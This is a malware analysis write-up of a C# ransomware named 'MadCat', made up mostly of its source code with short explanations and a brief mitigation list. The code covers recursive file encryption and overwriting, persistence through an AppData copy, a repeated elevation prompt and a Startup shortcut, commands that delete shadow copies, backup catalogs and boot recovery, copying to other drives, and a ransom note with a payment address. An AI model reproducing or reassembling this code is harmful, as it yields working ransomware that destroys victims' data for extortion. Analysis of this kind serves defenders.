# 📝 MadCat Ransomware Analysis

The "MadCat Ransomware" is a malicious C# program that encrypts files, demands a ransom, and disables recovery. Below is a detailed analysis of its functionality, with code snippets from `Program.cs`.

## 🚀 1. Initialization and Checks

The `Main` method orchestrates the ransomware's actions.

```csharp
private static void Main(string[] args)
{
    if (AlreadyRunning())
    {
        Environment.Exit(1);
    }
    if (checkSleep)
    {
        sleepOutOfTempFolder();
    }
    if (checkAdminPrivilage)
    {
        copyResistForAdmin(processName);
    }
    else if (checkCopyRoaming)
    {
        copyRoaming(processName);
    }
    if (checkStartupFolder)
    {
        addLinkToStartup();
    }
    lookForDirectories();
    if (checkAdminPrivilage)
    {
        if (checkdeleteShadowCopies)
        {
            deleteShadowCopies();
        }
        if (checkdisableRecoveryMode)
        {
            disableRecoveryMode();
        }
        if (checkdeleteBackupCatalog)
        {
            deleteBackupCatalog();
        }
    }
    if (checkSpread)
    {
        spreadIt(spreadName);
    }
    addAndOpenNote();
    SetWallpaper(base64Image);
    new Thread((ThreadStart)delegate
    {
        Run();
    }).Start();
}
```

- **Mutex**: Prevents multiple instances.
- **Sleep**: Delays execution.
- **Persistence**: Ensures startup and admin privileges.
- **Encryption**: Encrypts files.
- **Anti-Recovery**: Disables recovery options.
- **Propagation**: Spreads to drives.
- **Ransom Note**: Displays `HACKED.TXT`.
- **Wallpaper**: Sets custom background.

## 🔒 2. File Encryption

Encrypts files with specific extensions.

```csharp
private static void encryptDirectory(string location)
{
    try
    {
        string[] files = Directory.GetFiles(location);
        bool flag = true;
        for (int i = 0; i < files.Length; i++)
        {
            try
            {
                string extension = Path.GetExtension(files[i]);
                string fileName = Path.GetFileName(files[i]);
                if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
                {
                    continue;
                }
                FileInfo fileInfo = new FileInfo(files[i]);
                fileInfo.Attributes = FileAttributes.Normal;
                if (fileInfo.Length < 2117152)
                {
                    if (encryptionAesRsa)
                    {
                        EncryptFile(files[i]);
                    }
                }
                else if (fileInfo.Length > 200000000)
                {
                    Random random = new Random();
                    int length = random.Next(200000000, 300000000);
                    string @string = Encoding.UTF8.GetString(random_bytes(length));
                    File.WriteAllText(files[i], randomEncode(@string));
                    File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
                }
                else
                {
                    string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
                    File.WriteAllText(files[i], randomEncode(string2));
                    File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
                }
                if (flag)
                {
                    flag = false;
                    File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
                }
            }
            catch
            {
            }
        }
        string[] directories = Directory.GetDirectories(location);
        for (int j = 0; j < directories.Length; j++)
        {
            encryptDirectory(directories[j]);
        }
    }
    catch (Exception)
    {
    }
}

public static void EncryptFile(string file)
{
    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
    string text = CreatePassword(20);
    byte[] bytes = Encoding.UTF8.GetBytes(text);
    byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
    File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
    File.Move(file, file + "." + RandomStringForExtension(4));
}
```

- **Targets**: User folders and non-C: drives.
- **Small Files**: AES-256 with RSA-encrypted key.
- **Large Files**: Overwritten with random data.

## 🛡️ 3. Encryption Details

Uses AES-256 and RSA-1024.

```csharp
public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
{
    byte[] array = null;
    byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
    using MemoryStream memoryStream = new MemoryStream();
    using RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.KeySize = 256;
    rijndaelManaged.BlockSize = 128;
    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
    rijndaelManaged.Mode = CipherMode.CBC;
    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
    {
        cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
        cryptoStream.Close();
    }
    return memoryStream.ToArray();
}

public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
{
    byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
    using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
    try
    {
        rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
        byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
        return Convert.ToBase64String(inArray);
    }
    finally
    {
        rSACryptoServiceProvider.PersistKeyInCsp = false;
    }
}

public static string rsaKey()
{
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
    stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
    stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
    stringBuilder.AppendLine("  <Modulus>yPI4uNmgcB/hFcXfs4qj5XOQpCm8P/gRZ/B27VOQLip/ZHAVZQu9QmOLAywmiBNavLHHlCRtMA+L0z+YbcRKSN1cbwyyBORcJow4EK9Rlapzkl3ErnBPcQ1VZfSeaitqiYnr2AvTJZW6a70Qj0+FEfsLiwWa7DsHvtfuOYSh2YU=</Modulus>");
    stringBuilder.AppendLine("</RSAParameters>");
    return stringBuilder.ToString();
}
```

- **AES**: CBC mode, PBKDF2-derived key.
- **RSA**: Hardcoded public key.

## 🔄 4. Persistence Mechanisms

Ensures execution on startup.

```csharp
private static void copyRoaming(string processName)
{
    string friendlyName = AppDomain.CurrentDomain.FriendlyName;
    string location = Assembly.GetExecutingAssembly().Location;
    string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
    string text2 = text + processName;
    if (!(friendlyName != processName) && !(location != text2))
    {
        return;
    }
    if (!File.Exists(text2))
    {
        File.Copy(friendlyName, text2);
        ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
        processStartInfo.WorkingDirectory = text;
        Process process = new Process();
        process.StartInfo = processStartInfo;
        if (process.Start())
        {
            Environment.Exit(1);
        }
        return;
    }
    try
    {
        File.Delete(text2);
        Thread.Sleep(200);
        File.Copy(friendlyName, text2);
    }
    catch
    {
    }
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
    processStartInfo2.WorkingDirectory = text;
    Process process2 = new Process();
    process2.StartInfo = processStartInfo2;
    if (process2.Start())
    {
        Environment.Exit(1);
    }
}

private static void copyResistForAdmin(string processName)
{
    string friendlyName = AppDomain.CurrentDomain.FriendlyName;
    string location = Assembly.GetExecutingAssembly().Location;
    string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
    string text2 = text + processName;
    ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
    processStartInfo.UseShellExecute = true;
    processStartInfo.Verb = "runas";
    processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
    processStartInfo.WorkingDirectory = text;
    ProcessStartInfo startInfo = processStartInfo;
    Process process = new Process();
    process.StartInfo = startInfo;
    if (!(friendlyName != processName) && !(location != text2))
    {
        return;
    }
    if (!File.Exists(text2))
    {
        File.Copy(friendlyName, text2);
        try
        {
            Process.Start(startInfo);
            Environment.Exit(1);
            return;
        }
        catch (Win32Exception ex)
        {
            if (ex.NativeErrorCode == 1223)
            {
                copyResistForAdmin(processName);
            }
            return;
        }
    }
    try
    {
        File.Delete(text2);
        Thread.Sleep(200);
        File.Copy(friendlyName, text2);
    }
    catch
    {
    }
    try
    {
        Process.Start(startInfo);
        Environment.Exit(1);
    }
    catch (Win32Exception ex2)
    {
        if (ex2.NativeErrorCode == 1223)
        {
            copyResistForAdmin(processName);
        }
    }
}

private static void addLinkToStartup()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
    string text = Process.GetCurrentProcess().ProcessName;
    using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
    string location = Assembly.GetExecutingAssembly().Location;
    streamWriter.WriteLine("[InternetShortcut]");
    streamWriter.WriteLine("URL=file:///" + location);
    streamWriter.WriteLine("IconIndex=0");
    string text2 = location.Replace('\\', '/');
    streamWriter.WriteLine("IconFile=" + text2);
}
```

- **AppData**: Copies to `host.exe`.
- **Admin**: Elevates privileges.
- **Startup**: Adds `.url` shortcut.

## 🛑 5. Anti-Recovery Measures

Disables recovery options.

```csharp
private static void deleteShadowCopies()
{
    runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
}

private static void disableRecoveryMode()
{
    runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
}

private static void deleteBackupCatalog()
{
    runCommand("wbadmin delete catalog -quiet");
}

private static void runCommand(string commands)
{
    Process process = new Process();
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.Arguments = "/C " + commands;
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    process.StartInfo = processStartInfo;
    process.Start();
    process.WaitForExit();
}
```

- **Shadow Copies**: Deletes backups.
- **Recovery**: Disables recovery mode.
- **Catalog**: Removes backups.

## 🌐 6. Propagation

Spreads to removable drives.

```csharp
private static void spreadIt(string spreadName)
{
    DriveInfo[] drives = DriveInfo.GetDrives();
    foreach (DriveInfo driveInfo in drives)
    {
        if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
        {
            try
            {
                File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
            }
            catch
            {
            }
        }
    }
}
```

- Copies to non-C: drives as `surprise.exe`.

## 📜 7. Ransom Note

Displays ransom instructions.

```csharp
private static void addAndOpenNote()
{
    string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
    try
    {
        File.WriteAllLines(text, messages);
        Thread.Sleep(500);
        Process.Start(text);
    }
    catch
    {
    }
}

private static string[] messages = new string[12]
{
    "----> MadCat Ransomware <----", "All of your files have been encrypted", 
    "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", 
    "be able to decrypt them without our help.", "", "To recover your data please pay the ransom.", "", 
    "to be sure before you pay if we can decrypt your data or no, please contact us and send ONLY 1 File here (Hitters@skiff.com)", 
    "", "Required Payment: 0.3 BTC",
    "Bitcoin Address:  bc1qp6pn4aud0jj7mtcv6p0cua78wyelk9459mawze", ""
};
```

- Creates and opens `HACKED.TXT`.

## 🖼️ 8. Wallpaper Change

Sets a custom wallpaper.

```csharp
public static void SetWallpaper(string base64)
{
    if (base64 != "")
    {
        try
        {
            string text = Path.GetTempPath() + RandomString(9) + ".jpg";
            File.WriteAllBytes(text, Convert.FromBase64String(base64));
            SystemParametersInfo(20u, 0u, text, 3u);
        }
        catch
        {
        }
    }
}
```

- Decodes Base64 image.

## 🕵️ 9. Evasion Techniques

Avoids detection.

```csharp
private static bool AlreadyRunning()
{
    Process[] processes = Process.GetProcesses();
    Process currentProcess = Process.GetCurrentProcess();
    Process[] array = processes;
    foreach (Process process in array)
    {
        try
        {
            if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
            {
                return true;
            }
        }
        catch (Exception)
        {
        }
    }
    return false;
}

private static void sleepOutOfTempFolder()
{
    string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    if (directoryName != folderPath)
    {
        Thread.Sleep(sleepTextbox * 1000);
    }
}
```

- **Mutex**: Single instance.
- **Sleep**: Evades sandboxes.

## 📋 10. Clipboard Monitoring (Unused)

Defines but does not use clipboard monitoring.

```csharp
public static class NativeMethods
{
    public const int clp = 797;
    public static IntPtr intpreclp = new IntPtr(-3);
    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool AddClipboardFormatListener(IntPtr hwnd);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
}
```

- Unused functionality.

## 🛠️ Mitigation

- **Isolate**: Disconnect networks.
- **Backups**: Restore offline backups.
- **Remove**: Delete `host.exe` and Startup shortcuts.
- **Recover**: Re-enable recovery mode.